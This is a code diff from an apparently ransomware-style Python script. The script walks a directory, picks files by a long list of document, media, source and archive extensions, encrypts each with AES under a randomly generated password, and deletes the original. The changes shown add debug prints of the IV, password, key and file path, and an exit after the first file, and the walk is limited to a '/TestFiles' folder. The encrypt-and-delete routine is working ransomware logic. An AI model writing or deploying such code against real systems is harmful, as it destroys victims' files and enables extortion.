@@ -15,7 +15,7 @@ def encrypt_file(key, filename, filepath):
     dirpath = os.path.dirname(filepath)
     filesize = str(os.path.getsize(filepath)).zfill(16)
     iv = Random.new().read(16)  # Contains the initial value which will be used to start a cipher feedback mode
-
+    print(iv)
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
 
     with open(filepath, 'rb') as infile:  # opens the file
@@ -36,15 +36,19 @@ def encrypt_file(key, filename, filepath):
 def encrypt_all_files():
     # encrypt all files with following types
     password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # generate random password
+    print(password)
     ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
     for root, dirs, files in os.walk("/TestFiles", topdown=True):  # iterate from home
         for filename in files:
             if filename.endswith(ext) and not filename.startswith(encrypted_symbol):  # pick only certain files and not enc ones
                 try:
                     key = SHA256.new(password.encode('utf-8')).digest()  # generates a 256bit key from password
+                    print(key)
                     filepath = os.path.abspath(os.path.join(root, filename))
+                    print(filepath)
                     encrypt_file(key, filename, filepath)  # calls the encrypt function
                     os.remove(filepath)  # deletes the file
+                    sys.exit()
                 except:
                     pass
 
